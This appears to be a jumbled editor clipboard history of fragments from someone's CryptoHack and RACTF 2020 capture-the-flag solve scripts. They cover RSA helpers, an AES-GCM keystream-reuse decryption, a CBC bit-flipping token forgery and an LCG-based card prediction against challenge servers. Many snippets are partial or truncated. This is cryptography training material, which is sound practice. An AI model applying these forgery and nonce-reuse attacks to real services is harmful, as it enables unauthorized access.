c145b02ea2429668424370261b15a4bd|file:///home/neo/cryptohack/general/brainteasers/unencryptable.py|34|1|V|python
	# print(long_to_bytes(c))
1e87c5121cded34b401e3ba401529045|file:///home/neo/cryptohack/general/brainteasers/unencryptable.py|38|1|V|python
	# print(long_to_bytes(pt))
d6fec25db21b9ac1a8b80c9ca065c65e|file:///home/neo/cryptohack/general/brainteasers/unencryptable.py|35|1|V|python
	pt = encrypt(ct,e,N)
ddeb3415fd32f3ec4f6b92e651ba289f|file:///home/neo/cryptohack/general/brainteasers/output_unencryptable.txt|3|1|V|text
	N = 0x7fe8cafec59886e9318830f33747cafd200588406e7c42741859e15994ab62410438991ab5d9fc94f386219e3c27d6ffc73754f791e7b2c565611f8fe5054dd132b8c4f3eadcf1180cd8f2a3cc756b06996f2d5b67c390adcba9d444697b13d12b2badfc3c7d5459df16a047ca25f4d18570cd6fa727aed46394576cfdb56b41
40e712f30d56083318ab20a2402921d2|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|7|43|v|python
	symmetry
1518c155b1d74205c7e7b5671ede321b|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|12|1|V|python
	    flag_iv = encrypted_flag[:16]
	    encrypted_flag = encrypted_flag[16:]
	    first_flag_block = encrypted_flag[:16]
	    second_flag_block = encrypted_flag[16:32]
	
	    plaintext = b'b' * 16 * 2
	    encrypted_test = bytes.fromhex(requests.get(url= URL_ENCRYPT + plaintext.hex() + '/' + flag_iv.hex() + '/').json()['ciphertext'])
	    first_test_block = encrypted_test[:16]
	    second_test_block = encrypted_test[16:]
	    first_enc_output = xor_bytes(first_test_block, b'b' * 16)
	    second_enc_output = xor_bytes(second_test_block, b'b' * 16)
	
	    first_flag_block = xor_bytes(first_enc_output, first_flag_block) 
	    second_flag_block = xor_bytes(second_flag_block, second_enc_output)
	
	    flag = first_flag_block + second_flag_block
	    print(flag)
53942bf41dca0463a97f7c82150b05a2|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|18|1|V|python
	    print('Nonce: ', nonce)
3a90ac83535fb1f3d071e8beb25aa956|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|19|12|v|python
	Nonce
88dc7b912c796f4a15e5d11b59544186|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|13|1|V|python
	    test_pt = b'test'.hex()
9e2c1c538c989502ff2c5e34b6643a8c|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|14|5|V|python
	    # test_pt2 = b'test2'.hex()
ad0234829205b9033196ba818f7a872b|file:///home/neo/cryptohack/block-ciphers/gcm/solve.py|13|17|v|python
	test2
ad593c90a0cc1463e6f4da9734af5000|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|27|7|v|python
	f6d84127dd606a55297ec97b3af7346a
c8b9e615e04ab07d07451244252e86ad|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|26|7|v|python
	45d9df9e6e991dd93dce6d8f24393e77
ae4416236d3b03f42f25906f03e5b98d|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|26|1|V|python
	t0 = '45d9df9e6e991dd93dce6d8f24393e77'
	t1 = '5d134d55e4cc088d408917dfb28e970e'
	ad = '43727970746f4861636b'
	c0 = '135b2f45'
	c1 = '065c3f55'
39a2cee72b7c9829b215bf93bb8798be|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|26|6|v|python
	'45d9df9e6e991dd93dce6d8f24393e77'
7c353c6d28312587852b5cce44c3ad0a|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|27|6|v|python
	'5d134d55e4cc088d408917dfb28e970e'
be0946679300a2a029e5913d50aec7b3|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|28|6|v|python
	'43727970746f4861636b'
b6cc9d2073ad01a0c0a1b100e8484e32|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|29|6|v|python
	'135b2f45'
cdd59d8a0e78e25c02288f6bf247a268|file:///home/neo/cryptohack/block-ciphers/gcm/gcm.sage|30|6|v|python
	'065c3f55'
ad1b13f80fe8197573a2712316cedb47|file:///home/neo/CTFs/ractf2020/speedy/template.py|42|9|V|python
	        print(chall)
f4bd457bb3037afa031d14bab5d8a0cf|file:///home/neo/CTFs/ractf2020/speedy/template.py|44|9|V|python
	        p = 0
	        q = 0
fb28b27d7b159c727ca7aa8527be01fd|file:///home/neo/CTFs/ractf2020/speedy/template.py|52|9|V|python
	        print('Num:',num)
dbf5bdd7eff756aa6f1784fabafb0351|file:///home/neo/CTFs/ractf2020/speedy/template.py|53|13|V|python
	            print('P:', p)
5f3b73a3228a194708321aac825be403|file:///home/neo/CTFs/ractf2020/speedy/template.py|51|1|V|python
	        if num == b'p':
	            p = int(line[line.index(b': ')+2:], 10)
686169552953c7abd80d7e8ede77595c|file:///home/neo/CTFs/ractf2020/speedy/template.py|46|9|V|python
	        d = 0
c06295b1d85be074a4c594c3de6fbabb|file:///home/neo/CTFs/ractf2020/speedy/template.py|47|9|V|python
	        ct = 0
5f1e3ae2d421a4ee343b10ee45c37ace|file:///home/neo/CTFs/ractf2020/speedy/template.py|48|15|v|python
	line[4:line.index(b': ')]    
568de39a042fe964eeea9d6a42e95de5|file:///home/neo/CTFs/ractf2020/speedy/template.py|61|1|V|python
	        if s == b'd':
	            r = find_d(p,q,n)
1f52443f4f948985e468af94bf0a9312|file:///home/neo/CTFs/ractf2020/speedy/template.py|12|1|V|python
	    n = p * q
	    d = mod_inverse(e, n)
2380658c1f0518445e11f48c903a793d|file:///home/neo/CTFs/ractf2020/speedy/template.py|71|9|V|python
	        print(s)
9ce852731ae3ab0eb402d2544c5ce754|file:///home/neo/CTFs/ractf2020/speedy/template.py|74|1|V|python
	        if s == b'ct':
	            r = find_ct(p,q,n,pt)
	            print('ct: ', ct)
d692d5c7538e0024d7a0d4506b422d43|file:///home/neo/CTFs/ractf2020/speedy/template.py|78|17|v|python
	find_ct(p,q,n,pt)
c19fa7df8852be8fbba00e76d78f3a5a|file:///home/neo/CTFs/ractf2020/secret/encrypt.py|16|6|v|python
	0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000s
a51b540ccbe8e4680c5f5083e53b68ea|file:///home/neo/CTFs/ractf2020/secret/encrypt.py|16|6|v|python
	0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000s&nYASMBl==Raa6f1mSybO1&`Pn=MSlA^HVasQovKL?f9nB=?Wjz*-}bj4rNeU}9v(Tcn16Ji;Mjv?)4T@pD@76=9j%)LevT&=&p%BMcIckO@P450UqkjIR6DT^igJmh5<xI<alHa3p;VuZ%5HWp>1
5ca11d1c73e5098fcd1a03617c8a9f9b|file:///home/neo/CTFs/ractf2020/secret/encrypt.py|15|5|V|python
	    return b'  -*-*-*- BEGIN ARR ESS AYY MSG -*-*-*-\n' + key + b'\n' + e_str + b'\n' + ct + b'\n' + b'   -*-*-*- END ARR ESS AYY MSG -*-*-*-\
a290747d66637e14c411fa7861eb6259|file:///home/neo/CTFs/ractf2020/secret/encrypt.py|14|28|v|python
	int.to_bytes(e,4,'big')
d76f55a89a4c7dbabc4f08a057553be5|file:///home/neo/CTFs/ractf2020/secret/encrypt.py|20|156|v|python
	*WY0^
c338930b7b495d5c74d5a2d2a43a828d|file:///home/neo/CTFs/ractf2020/secret/encrypt.py|20|1|V|python
	jx@>fERjV6gRSH!+pdv<kOoEVD#<P05<nAMIT@fYQOcbQ{VfQh+sli_--_zE8)G@9Y^2j=XLkGz;kZTPS&eJtOKwM~!V6SmtDRCJ%568a_utlnc?ywyQ^??W!-Ro`%%d9c?q+nQ*s<4Sn4@*0vXe9sl<*c8*WY0^
04b29a4b73ba0d0c0760a0e00a9b0adc|file:///home/neo/CTFs/ractf2020/secret/encrypt.py|20|1|V|python
	key = base64.b85decode(key)
3abba0cec9c360ff943867e6a8bc9193|file:///home/neo/CTFs/ractf2020/secret/encrypt.py|14|1|V|python
	
	key = '0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000s&nYASMBl==Raa6f1mSybO1&`Pn=MSlA^HVasQovKL?f9nB=?Wjz*-}bj4rNeU}9v(Tcn16Ji;Mjv?)4T@pD@76=9j%)LevT&=&p%BMcIckO@P450UqkjIR6DT^igJmh5<xI<alHa3p;VuZ%5HWp>1#T6e(?T*2I'
	e = '00962'
	ct = 'jx@>fERjV6gRSH!+pdv<kOoEVD#<P05<nAMIT@fYQOcbQ{VfQh+sli_--_zE8)G@9Y^2j=XLkGz;kZTPS&eJtOKwM~!V6SmtDRCJ%568a_utlnc?ywyQ^??W!-Ro`%%d9c?q+nQ*s<4Sn4@*0vXe9sl<*c8*WY0^'
	key = base64.b85decode(key)
	e = base64.b85decode(e)
	e = int.from_bytes(e, 4, 'big')
	ct = base64.b85decode(ct)
	print(key)
	print(e)
	print(ct)
8206fa98e9627a680bcbe7147685dd12|file:///home/neo/CTFs/ractf2020/secret/encrypt.py|9|1|V|python
	        key.append((j^(s:=s^i),s:=s^j)[0])
3ab4453f7f6e2aa91542d0c88745d4f9|file:///home/neo/CTFs/ractf2020/secret/encrypt.py|6|1|V|python
	    s,key=0,bytearray()
ae2755e2264db2856aeeaf1b44ba11b0|file:///home/neo/CTFs/ractf2020/secret/encrypt.py|5|1|V|python
	    p,q=int.to_bytes(p,128,'big'),int.to_bytes(q,128,'big')
4ed4f2ac7fa9477d6a47396c830236a0|file:///home/neo/CTFs/ractf2020/secret/encrypt.py|7|1|V|python
	    for(i,j)in zip(p,q):
	        key.append(i^s)
	        key.append((j^(s:=s^i),s:=s^j)[0])
cf0a9d5a76d2628e775c7830a86f4796|file:///home/neo/CTFs/ractf2020/secret/decrypt.py|13|5|V|python
	    print(c1, c2)
ec35b3be69a858c596344db760425745|file:///home/neo/CTFs/ractf2020/secret/decrypt.py|36|4|V|python
	p = ''.join(c for c in a)
	q = ''.join(c for c in b)
46d398780a40deabcc04847ee43ce2ff|file:///home/neo/CTFs/ractf2020/secret/decrypt.py|41|7|V|python
	print(p)
	print(q)
44840194c1f4be4e49921cf193a1a3df|file:///home/neo/CTFs/ractf2020/secret/decrypt.py|44|1|V|python
	# print(e)
cd0c774a220c7f29bd3b707a33c8fc51|file:///home/neo/CTFs/ractf2020/secret/decrypt.py|10|1|V|python
	e = int.from_bytes(e,'big')
aad69117ad07624a783e75ee46895809|file:///home/neo/CTFs/ractf2020/secret/decrypt.py|42|1|V|python
	p = bytes_to_long(p)
	q = bytes_to_long(q)
96b0652448d6523bf0fd0eda3fd15b3b|file:///home/neo/CTFs/ractf2020/secret/decrypt.py|42|1|V|python
	p = int.from_bytes(p,'big')
ab7f9ea31bdd3fe5a9e528e856794424|file:///home/neo/CTFs/ractf2020/secret/encrypt.py|3|8|v|python
	base64.b85encode(rsa.encrypt(rsa.solve_for(p=p,q=q,e=e),message.encode()))
d765be56654decb2d89adcf163fc0061|file:///home/neo/CTFs/ractf2020/secret/decrypt.py|46|6|v|python
	bytes_to_long
b170fe1cc1d5498ce06f596c21bb13b9|file:///home/neo/CTFs/ractf2020/speedy/template.py|78|1|V|python
	        if s == b'n':
	            r = p * q
	            print('ct: ', ct)
e14bf313442d67088e4481ef6d93152b|file:///home/neo/CTFs/ractf2020/speedy/template.py|62|1|V|python
	            print('P: ', p)
ea271e7b0b4b19ca9fe7ca26dc1fa9e2|file:///home/neo/CTFs/ractf2020/speedy/template.py|70|18|v|python
	int(line[line.index(b': ')+2:], 10)
868025208403da30ed9e216ddeb80f3a|file:///home/neo/CTFs/ractf2020/speedy/template.py|16|1|V|python
	def find_pt(p, q, e, ct):
	    n = p * q
	    d = mod_inverse(e, n)
	    pt = pow(ct, d, n)
	    return pt
72dee3fac0645b047cef5a16a9fafc6b|file:///home/neo/CTFs/ractf2020/speedy/template.py|77|13|V|python
	            r = find_pt(p,q,e,ct)
9b37e4ecc388d7a2ed72ae3b7e77f423|file:///home/neo/CTFs/ractf2020/speedy/template.py|11|1|V|python
	def find_d(p, q, e):
	    n = p * q
	    d = mod_inverse(e, n)
	    return d
48f263f2e209c9c7491b1d77508c90ab|file:///home/neo/CTFs/ractf2020/speedy/template.py|69|13|V|python
	            r = find_d(p,q,n)
884c9bb672bdbbe579dc60f98f2a0394|file:///home/neo/CTFs/ractf2020/speedy/template.py|11|1|V|python
	def find_d(p, q, e):
9924184071b1597df5d6e61e340b44a5|file:///home/neo/CTFs/ractf2020/speedy/template.py|11|5|V|python
	    n = p * q
	    d = mod_inverse(e, n)
	    return d
8ab0834ca4c306f4e188a4b2e5eaccbd|file:///home/neo/CTFs/ractf2020/speedy/template.py|72|13|V|python
	            return d
4925f79e979097cb0b9b78bd7d4d8f17|file:///home/neo/CTFs/ractf2020/speedy/template.py|77|13|V|python
	                d = mod_inverse(e, phi)
d4db6c42bba31d6bfcc553a3557f8de4|file:///home/neo/CTFs/ractf2020/access/solve.py|7|13|v|python
	socket.cryptohack.org
ecb320400c786ebba312e2ccd86e7490|file:///home/neo/CTFs/ractf2020/access/solve.py|7|29|v|python
	13383
9a3a6f1534b5b3dee42bce55d821bdef|file:///home/neo/CTFs/ractf2020/access/solve.py|17|1|V|python
	def get_mul_inc(x0, x1, x2, mod):
	    mul = (x2-x1) * mod_inverse((x1-x0),mod) % mod
	    inc = (x1 - mul * x0) % mod
	    return mul, inc
	
	def rebase(n, b=52):
	    if n < b:
	        return [n]
	    else:
	        return [n % b] + rebase(n//b, b)
	
e06db2107a1c9a605ac9caabb6f72602|file:///home/neo/CTFs/ractf2020/access/solve.py|17|1|V|python
	@total_ordering class Card:
	    def __init__(self, value, suit):
	        self.value = value
	        self.suit = suit
	
	    def __str__(self):
	        return f"{self.value} of {self.suit}"
	
	    def __eq__(self, other):
	        return self.value == other.value
	
	    def __gt__(self, other):
	        return VALUES.index(self.value) > VALUES.index(other.value)
	
	class CustomCard:
	    def __init__(self, value, suit):
	        self.value = value
	        self.suit = suit
	
	    def __str__(self):
	        return f"{self.value} of {self.suit}"
	
	    def __eq__(self, other):
	        return self.value == other.value and self.suit == other.suit
	
	    def __gt__(self, other):
	        return VALUES.index(self.value) > VALUES.index(other.value)
	
	VALUES = ['Ace', 'Two', 'Three', 'Four', 'Five', 'Six',
	          'Seven', 'Eight', 'Nine', 'Ten', 'Jack', 'Queen', 'King']
	SUITS = ['Clubs', 'Hearts', 'Diamonds', 'Spades']
	custom_deck = [CustomCard(value, suit) for suit in SUITS for value in VALUES]
	real_deck = [Card(value, suit) for suit in SUITS for value in VALUES]
	
0208c13132bc58cbfc7190d7cb711e28|file:///home/neo/CTFs/ractf2020/access/solve.py|17|1|V|python
	mod = 2**61 - 1  # 9th mersenne prime
	# print(mod)
	
608dc39600bb5ed5b3bc2277d30d219d|file:///home/neo/CTFs/ractf2020/access/solve.py|19|1|V|python
	hand = rec['hand'].split(' ')
	value = hand[0]
	suit = hand[2]
	card = custom_deck.index(CustomCard(value, suit))
	msg = rec['msg']
	# print(msg)
	msg = msg.split()
	next_shuffle = int(msg[msg.index('after')+1]) - 1
	# print(f"{card} * (52 ** {next_shuffle})")
	rand_num = card * (52 ** next_shuffle)
	total_rounds = 0
	card_arr = []
	random_nums = []
	current_deal = []
	while next_shuffle > 0:
	    next_shuffle -= 1
6a07e1a019c4557bff2e0447748b43e4|file:///home/neo/CTFs/ractf2020/access/solve.py|20|1|V|python
	    total_rounds += 1
	    rec = json_recv()
	    hand = rec['hand']
	    # print(hand)
	    hand = hand.split()
	    msg = rec['msg']
	    # print(msg)
	    msg = msg.split()
	    value = hand[0]
	    suit = hand[2]
	    current_card = Card(value, suit)
	    current_deal.insert(0, custom_deck.index(current_card))
	    card = custom_deck.index(CustomCard(value, suit))
	    # print(card)
	    card_arr.insert(0,card)
	    # print(f"{card} * (52 ** {next_shuffle})")
	    rand_num += card * (52 ** next_shuffle)
	    if 'reshuffle' in msg:
	        # print(current_deal)
	        # print('--------------\n')
	        # current_deal = reversed(current_deal)
	        # for card in current_deal:
	        #     print(custom_deck[card])
	        current_deal = []
	        random_nums.append(rand_num)
	        # print('Random num:', rand_num)
	        # print(rand_num)
	        if len(random_nums) == 3:
	            mul, inc = get_mul_inc(random_nums[0], random_nums[1], random_nums[2], mod) 
	            print('Mul: ', mul)
	            print('Inc: ', inc)
	            next_rand_num = (random_nums[2] * mul + inc) % mod
	            # print('Next random num:', next_rand_num)
	            next_deal = rebase(next_rand_num)
	            # print(next_deal)
	            while total_rounds <= 100:
	                hidden = next_deal.pop()
	                hidden_card = real_deck[hidden]
	                # print('Current card:', current_card)
	                # print('Guessed hidden card:', hidden_card, hidden)
	                if next_deal == []:
	                    next_rand_num = (next_rand_num * mul + inc) % mod
	                    next_deal = rebase(next_rand_num)
	                if hidden_card < current_card:      
	                    json_send({"choice":"l"})
	                else:
	                    json_send({"choice":"h"})
	                rec = json_recv()
	                if total_rounds == 99 or total_rounds == 98:
	                    print(rec)
	                real_hidden_card = rec['hand'].split(' ')
	                real_hidden_card = Card(real_hidden_card[0], real_hidden_card[2])
	                # print('Real hidden card:', real_hidden_card, real_deck.index(real_hidden_card))
	                current_card = hidden_card
	                total_rounds += 1
	
	            # print('Next random num: ', next_rand_num)
	        next_shuffle = int(msg[msg.index('after')+1])
	        rand_num = 0 
	        card_arr = []
1237c63cb3341aa9cec350a320284f09|file:///home/neo/CTFs/ractf2020/access/solve.py|17|1|V|python
	r.sen
ad47f40df114947f6fac788a7f2f8991|file:///home/neo/CTFs/ractf2020/access/solve.py|19|1|V|python
	tok = r.recvline()
bad00ed0ed3e1a3d7698418311d229e5|file:///home/neo/CTFs/ractf2020/access/solve.py|11|5|V|python
	    print(line.decode())
c2bec9c1e06b2d999cac9c96481481e6|file:///home/neo/CTFs/ractf2020/access/solve.py|20|1|V|python
	print(tok)
b9a40d172c43e99bf6c2c1b8740d5a56|file:///home/neo/CTFs/ractf2020/access/access.py|1|1|V|python
	from Crypto.Util.Padding import pad, unpad
	from Crypto.Cipher import AES
	from Crypto.Random import get_random_bytes
	from datetime import datetime, timedelta
c021efb88dd0817b4ab64c0a10c1bf51|file:///home/neo/CTFs/ractf2020/access/access.py|26|18|v|python
	(datetime.today() + timedelta(days=1)).strftime("%s")
c132b973477eae075408cb0b28935287|file:///home/neo/CTFs/ractf2020/access/solve.py|22|9|V|python
	print(iv)
	print(len(ct))
9619ead20993fb46477997e283b9ae56|file:///home/neo/CTFs/ractf2020/access/solve.py|22|1|V|python
	# rec = json_recv()
	# round_num = rec['round']
bac2fa1a9297571553f22730edb5fbb9|file:///home/neo/CTFs/ractf2020/access/access.py|4|1|V|python
	from datetime import datetime, timedelta
e544fe0828339100855c86522c250e20|file:///home/neo/CTFs/ractf2020/access/access.py|26|1|V|python
	    expires_at = (datetime.today() + timedelta(days=1)).strftime("%s")
	    token = f"access=9999;expiry={expires_at}".encode()
7b9307a5db140452d7ad66fc591facb4|file:///home/neo/CTFs/ractf2020/access/access.py|27|1|V|python
	    token = f"access=9999;expiry={expires_at}".encode()
132171195d2358748386837241f2d676|file:///home/neo/CTFs/ractf2020/access/solve.py|16|39|v|python
	{expires_at}".encode()
c69569ba962384734f6b3689281cacd5|file:///home/neo/CTFs/ractf2020/access/solve.py|34|1|V|python
	start = (datetime.today() + timedelta(days=1)).strftime("%s")
ea2b2676c28c0db26d39331a336c6b92|file:///home/neo/CTFs/ractf2020/access/solve.py|31|1|v|python
	start
5979744f2cf3783ec8397bdb1e844f5b|file:///home/neo/CTFs/ractf2020/access/solve.py|27|1|V|python
	original_half_token = b"access=9999;expiry="
2513e27f01c3b8520ba1dc67cad17b33|file:///home/neo/CTFs/ractf2020/access/solve.py|27|1|V|python
	original_half_token = b"ry="
1a31649261461cbd6e55e52df83f0ecf|file:///home/neo/CTFs/ractf2020/access/solve.py|41|5|V|python
	    fake_ct = original_first_block + fake_block
ddf496257b31e6aedf8a86bf3c7489a7|file:///home/neo/CTFs/ractf2020/access/solve.py|39|5|V|python
	    fake_block = xor_bytes(original_first_block)
55ac787e279a05105c8841a66432a482|file:///home/neo/CTFs/ractf2020/access/solve.py|29|1|V|python
	r.recvuntil('choice: ')
69f5f141231bf167ea9a7a9c853ece1e|file:///home/neo/CTFs/ractf2020/access/solve.py|42|1|V|python
	    r.recvuntil('choice: ')
0162cefc4952304026cb1f5dab2419d2|file:///home/neo/CTFs/ractf2020/access/solve.py|44|18|v|python
	choice
137f87096468621f22a0dc24955ffc96|file:///home/neo/CTFs/ractf2020/access/solve.py|22|1|V|python
	
	def json_send(hsh):
	    request = json.dumps(hsh).encode()
	    r.sendline(requeskkk
742267d3282084e9a7167063d164e994|file:///home/neo/CTFs/ractf2020/access/solve.py|41|5|V|python
	    r.sendline(iv.hex())
9c6c48849688c2771395c0b7054e0ac8|file:///home/neo/CTFs/ractf2020/access/solve.py|26|13|v|python
	(datetime.today() + timedelta(days=1)).strftime("%s"))
2227bc91aa5872c883c07908f01da91c|file:///home/neo/CTFs/ractf2020/access/solve.py|30|12|V|python
	print(start)
	print(end)
984d90ed47b3e8ccb23c748008d49494|file:///home/neo/CTFs/ractf2020/access/solve.py|37|5|V|python
	    print(try_token)
5a0214ff48d28f3c49856b5e1501c1ff|file:///home/neo/CTFs/ractf2020/access/solve.py|31|1|V|python
	print(iv)
30f2e0967b85ef8a5b1b7ab5d9d1cce9|file:///home/neo/CTFs/ractf2020/access/solve.py|38|1|V|python
	    fake_ct = fake_block + original_second_block
0e26c8a314926d8061d31dfb0e2e9556|file:///home/neo/CTFs/ractf2020/access/solve.py|39|15|v|python
	fake_block
1df6f5f8a1a6429c7c544dc90fa5ce6c|file:///home/neo/CTFs/ractf2020/access/solve.py|46|5|V|python
	    print(iv.hex())
83aa1604c8bf11a648b70ccaffeb3a39|file:///home/neo/CTFs/ractf2020/access/solve.py|48|5|V|python
	    print(res)
227c7c9f95caadc91c7b7d35c26af8cb|file:///home/neo/CTFs/ractf2020/access/solve.py|39|5|V|python
	    fake_ct = original_first_block + original_second_block
936a58e2308c7ecc7a62a3a1728dc88e|file:///home/neo/CTFs/ractf2020/access/solve.py|40|33|v|python
	try_token
8c28abe9da0521bebfeab9bc56c979ea|file:///home/neo/CTFs/ractf2020/speedy/template.py|90|1|V|python
	        s.sendall(bytes(str(r), 'ascii'))
2083f34a2eb022a36e25783254caa4d3|file:///home/neo/CTFs/ractf2020/access/access.py|20|1|V|python
	    if b"access=0000" in unpadded:
	        return {"flag": FLAG}
7550d6777163139528236759b0a6b352|file:///home/neo/CTFs/ractf2020/access/solve.py|40|1|V|python
	    print(xor_bytes(fake_block, try_token))
4866c86cba96da1c97f799f23d4eb666|file:///home/neo/CTFs/ractf2020/access/access.py|29|5|V|python
	    print(token)
a5cfdbe0bc1a5a5e20a3f141f1206925|file:///home/neo/CTFs/ractf2020/access/solve.py|38|1|V|python
	    try_token = pad(bytes(f"ry={time}",'ascii'), 16)
49a157227a623c1c5f60f793fe3b3aa8|file:///home/neo/CTFs/ractf2020/access/solve.py|35|39|v|python
	1591712438
79711116393ddb48b8267a78957595ca|file:///home/neo/CTFs/ractf2020/access/solve.py|37|1|V|python
	print(original_token)
8e37607eff45311673d957c9e6c5f92d|file:///home/neo/CTFs/ractf2020/access/solve.py|41|5|V|python
	    try_token = original_token
46f219d8231818eb06adb640d5bab0b7|file:///home/neo/CTFs/ractf2020/access/solve.py|40|1|V|python
	    try_token = pad(bytes(f"ry=1591712438",'ascii'), 16)
1e07297a7b6908e213af96ad1ca3b448|file:///home/neo/CTFs/ractf2020/access/solve.py|36|1|V|python
	original_token = b'access=9999;expiry=1591712438'[16:]
9ea311af7275addbdf8d386e349c1cbe|file:///home/neo/CTFs/ractf2020/access/solve.py|30|22|v|python
	f95cf707fc884c5fc1528ab3d277ceb425169178e1f00a1052d50d3944106fe8c3f4d775a237e34d641118ad68fb00a8
ebb59547ae882f4bd0541035a1eebe6a|file:///home/neo/CTFs/ractf2020/access/solve.py|29|1|V|python
	'0e9da061df996d86eb5ec750e4fc0a26fde6045ebda52cb6fadbbee109fd51a69f8cc16e613f577c848617545fd543ef'}
d47be33ccde179920ad80651431a3910|file:///home/neo/CTFs/ractf2020/access/solve.py|36|18|v|python
	b'access=9999;expiry=1591713193\x03\x03\x03'
ca4d40f3444a975e672c7b500b7e5272|file:///home/neo/CTFs/ractf2020/access/solve.py|29|21|v|python
	'0e9da061df996d86eb5ec750e4fc0a26fde6045ebda52cb6fadbbee109fd51a69f8cc16e613f577c848617545fd543ef'
798a7cf046b6a5838fa6277b2db49e79|file:///home/neo/CTFs/ractf2020/access/solve.py|39|5|V|python
	    # try_token = pad(bytes(f"ry=1591712438",'ascii'), 16)
ed33a449c5031da0fcb3fc6a5675faf6|file:///home/neo/CTFs/ractf2020/access/solve.py|43|11|v|python
	fake_ct
cad963293d9cb5b4db7bf1c2e0d11aff|file:///home/neo/CTFs/ractf2020/access/solve.py|29|22|v|python
	e4371f37fa05d96a02df7188643f72b7b0b58d82f244fb075fdee5d1c583fc5c328ee4ae5095657456519e0155894781
f6f111080d3dc12185eb50ce1b19b6a5|file:///home/neo/CTFs/ractf2020/access/solve.py|44|5|V|python
	    print(xor_bytes(fake_ct[:16], try_token))
b0bbe34a676ab7b36a739620c15c7c5e|file:///home/neo/CTFs/ractf2020/access/solve.py|42|5|V|python
	    fake_block = try_token
ff8b95f4d2a4fed46f440e297d6e39dd|file:///home/neo/CTFs/ractf2020/access/solve.py|42|5|V|python
	    print(fake_ct)
ab45268302c24beffdc7170f0f217647|file:///home/neo/CTFs/ractf2020/access/solve.py|36|62|v|python
	b'access=9999;expiry=1591713351\x03\x03\x03'
63c8923e58a59e1ad32b7c6fa0362096|file:///home/neo/CTFs/ractf2020/access/solve.py|30|119|v|python
	}'e4371f37fa05d96a02df7188643f72b7b0b58d82f244fb075fdee5d1c583fc5c328ee4ae5095657456519e0155894781'
a0672512cd11b274678b1b805476d6c6|file:///home/neo/CTFs/ractf2020/access/solve.py|24|1|V|python
	print(target)
72ad9734c7f913fcd671b07bc1f03525|file:///home/neo/CTFs/ractf2020/access/solve.py|47|1|V|python
	    print(fake_ct.hex())
c8f8a52204cf06b49eeb928a9b89b10a|file:///home/neo/CTFs/ractf2020/access/solve.py|41|5|V|python
	    print(xor_bytes(original_token, fake_block))
7cb25f281c52f4556ba8bf70c10dba06|file:///home/neo/CTFs/ractf2020/access/solve.py|42|1|V|python
	    print(ct)
	    print(ct.hex())
	    print(fake_ct)
	    print(fake_ct.hex())
	    print(iv.hex())
51837fae4ed935a6c839a1f3784a9a78|file:///home/neo/CTFs/ractf2020/access/solve.py|41|1|V|python
	    fake_ct = fake_block + original_second_block
	    # print(ct)
7c22ed1d5f31021e8f26d94171779b68|file:///home/neo/CTFs/ractf2020/access/solve.py|58|1|V|python
	# json_send({"choice":"h"})
3298fc5fa67df9be60ded4410b8fffbf|file:///home/neo/CTFs/ractf2020/access/solve.py|43|13|V|python
	    print(ct)
	    print(ct.hex())
ee38afa0c7c33bb24b2fa9a7e4e4e7af|file:///home/neo/CTFs/ractf2020/access/solve.py|11|1|V|python
	    if not isinstance(bytes1, bytes) or not isinstance(bytes2, bytes):
	        raise TypeError
	    if len(bytes1) != len(bytes2):
	        raise Exception('Chunks must have the same length')
	    xored = bytearray(bytes1)
	    for i, b in enumerate(bytes2):
	        xored[i] ^= b
	    return bytes(xored)
23acceecf103768f091b36010844ea27|file:///home/neo/CTFs/ractf2020/access/solve.py|9|27|v|python
	bytes2
289dbc9dd0293229273dfd2c3a661f27|file:///home/neo/CTFs/ractf2020/access/solve.py|22|1|V|python
	tok = bytes.fromhex('64a4830b8070f2b6fbaf8e4bdda1c95762f46217c24117f49359c2d236cffb22f6e5b8b7f119fa040decfcad6ee3303e')
6ced4f5aaf98161856d1acafeef100b2|file:///home/neo/CTFs/ractf2020/access/solve.py|27|1|V|python
	original_token = b'access=9999;expiry=1591714151\x03\x03\x03'[16:]
d6be1e84c93adc1bfa881b672c5f0627|file:///home/neo/CTFs/ractf2020/access/solve.py|34|1|V|python
	    print(fake_ct)
	    print(fake_ct.hex())
	    print(iv.hex())
56b2e133dedf8b91bcd867f180d1ef92|file:///home/neo/CTFs/ractf2020/speedy/template.py|91|9|V|python
	        print('sent')
7c0e586bf142ac35bd737b815ad7cbdc|file:///home/neo/CTFs/ractf2020/speedy/template.py|39|8|V|python
	    if mode == b'*':
	        ...
2cc02f45f973873fda7cfc38f2093028|file:///home/neo/CTFs/ractf2020/speedy/template.py|63|20|V|python
	    elif mode == b'!':
	        ...
789bf06bfea335d00cf738398bb1fdf9|file:///home/neo/CTFs/ractf2020/speedy/template.py|39|9|V|python
	        chall = line[3:-1] 
f7760a7423955d710fde58e96327b40a|file:///home/neo/CTFs/ractf2020/speedy/template.py|77|1|V|python
	            print('pt: ', r)
eff6a71b6ce27c8716828b18e3f1d2e8|file:///home/neo/CTFs/ractf2020/speedy/template.py|62|9|V|python
	        s.sendall(b'a')
80e8a9bed933dd9241c7935a805c4cfa|file:///home/neo/CTFs/ractf2020/speedy/template.py|84|5|V|python
	        # print(bytes(str(r), 'ascii'))
aa77c736c86ebcb0aa74727df92fda7e|file:///home/neo/CTFs/ractf2020/speedy/template.py|47|1|V|python
	        if num == b'p':
	            p = int(line[line.index(b': ')+2:], 10)
	            # print('P: ', p)
aff9da30873c2a055e0da8badbd8d226|file:///home/neo/CTFs/ractf2020/speedy/template.py|88|19|v|python
	bytes(str(r), 'ascii')
aee71a581a1631691a174525b9565761|file:///home/neo/CTFs/ractf2020/speedy/template.py|88|9|V|python
	        print(r)
